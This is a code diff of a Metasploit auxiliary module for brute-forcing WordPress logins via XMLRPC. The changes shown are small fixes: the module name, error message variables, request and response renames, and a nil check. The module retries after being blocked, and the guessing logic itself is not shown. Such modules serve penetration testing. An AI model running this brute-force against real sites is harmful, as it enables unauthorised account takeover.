@@ -12,7 +12,7 @@ class Metasploit3 < Msf::Auxiliary
   def initialize(info = {})
     super(update_info(
             info,
-            'Name'         => 'WordPress XMLRPC Massive Bruteforce ',
+            'Name'         => 'WordPress XMLRPC Massive Bruteforce',
             'Description'  => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
             'License'      => MSF_LICENSE,
             'Author'       =>
@@ -101,10 +101,10 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Checking #{peer} status!")
 
     if !wordpress_and_online?
-      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
+      print_error("#{peer}:#{rport}#{target_uri} does not appear to be running Wordpress or you got blocked! (Do Manual Check)")
       nil
     elsif !wordpress_xmlrpc_enabled?
-      print_error("#{rhost}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
+      print_error("#{peer}:#{rport}#{wordpress_url_xmlrpc} does not enable XMLRPC")
       nil
     else
       print_status("Target #{peer} is running Wordpress")
@@ -127,15 +127,15 @@ class Metasploit3 < Msf::Auxiliary
       }
     client = Rex::Proto::Http::Client.new(rhost)
     client.connect
-    request  = client.request_cgi(opts)
-    response = client.send_recv(request)
+    req  = client.request_cgi(opts)
+    res  = client.send_recv(req)
 
-    if response.code != 200
+    if res && res.code != 200
       print_error('It seems you got blocked!')
       print_warning("I'll sleep for #{datastore['BLOCKEDWAIT']} minutes, then I'll try again. CTR+C to exit")
       sleep datastore['BLOCKEDWAIT'] * 60
     end
-    @response = response
+    @response = res
   end
 
   def run
